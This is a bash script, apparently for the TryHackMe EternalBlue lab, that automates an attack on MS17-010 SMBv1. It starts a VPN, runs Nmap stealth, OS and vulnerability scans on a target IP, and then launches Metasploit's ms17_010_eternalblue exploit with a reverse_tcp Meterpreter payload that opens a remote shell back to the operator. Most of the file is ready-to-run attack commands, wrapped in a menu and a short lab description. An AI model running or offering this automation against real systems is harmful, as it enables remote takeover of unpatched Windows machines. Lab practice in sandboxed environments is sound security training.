#!/bin/bash

# ---------------------------------------------
# Title: EternalBlue TryHackMe Lab Interactive Script
# Author: For Educational Use Only
# ---------------------------------------------

# Function: Show lab description
show_description() {
    echo -e "\n🧠 EternalBlue Lab – TryHackMe"
    echo "--------------------------------------------"
    echo "This lab focuses on exploiting the MS17-010 SMBv1 vulnerability (a.k.a. EternalBlue),"
    echo "famously used in the WannaCry ransomware attack."
    echo
    echo "🔍 You will learn:"
    echo "- How SMB works and why SMBv1 is insecure"
    echo "- How to detect vulnerable machines"
    echo "- How to exploit MS17-010 using Metasploit"
    echo "- Post-exploitation basics"
    echo "--------------------------------------------"
}

# Function: Show task list
show_tasks() {
    echo -e "\n📋 EternalBlue Lab Task Checklist"
    echo "--------------------------------------------"
    echo "1. Connect to TryHackMe VPN"
    echo "2. Discover the target machine"
    echo "3. Scan the target with Nmap"
    echo "4. Confirm if MS17-010 is vulnerable"
    echo "5. Use Metasploit to exploit EternalBlue"
    echo "6. Get a Meterpreter session"
    echo "7. Enumerate and escalate privileges"
    echo "--------------------------------------------"
}

# Function: Perform exploit process
exploit_lab() {
    # Step 1: VPN
    cd /home/kali/Downloads
    read -p "[?] Enter path to your TryHackMe .ovpn file: " vpnfile
    if [[ ! -f "$vpnfile" ]]; then
        echo "[!] Error: File not found: $vpnfile"
        return
    fi

    echo "[+] Starting VPN connection..."
    sudo openvpn --config "$vpnfile" &
    sleep 10

    echo "[i] VPN started. Checking for tun interface..."
    ip a | grep tun

    # Step 2: Get user input
    read -p "[?] Enter Target IP (RHOST): " rhost
    read -p "[?] Enter Your IP (LHOST): " lhost
    read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
    lport=${lport:-4444}

    # Step 3: Nmap Scans
    echo "[+] Running initial Nmap scan (Stealth, Version, OS)..."
    nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt

    echo "[+] Running vulnerability script scan..."
    nmap -sV --script vuln "$rhost" -oN vuln_scan.txt

    echo "[i] Nmap scans complete. Results saved."
    read -p "[*] Press Enter to launch EternalBlue exploit..."

    # Step 4: Launch Metasploit
    echo "[+] Launching Metasploit..."
    msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $rhost;
set LHOST $lhost;
set LPORT $lport;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
exploit;
exit;"
}

# Main Menu
while true; do
    echo -e "\n🌐 EternalBlue Lab - Menu"
    echo "--------------------------------------------"
    echo "1. View Lab Description"
    echo "2. View Task Checklist"
    echo "3. Start Exploitation Lab"
    echo "4. Exit"
    echo "--------------------------------------------"
    read -p "[*] Choose an option [1-4]: " choice

    case $choice in
        1) show_description ;;
        2) show_tasks ;;
        3) exploit_lab ;;
        4) echo "Goodbye!"; exit 0 ;;
        *) echo "[!] Invalid option. Please choose 1-4." ;;
    esac
done
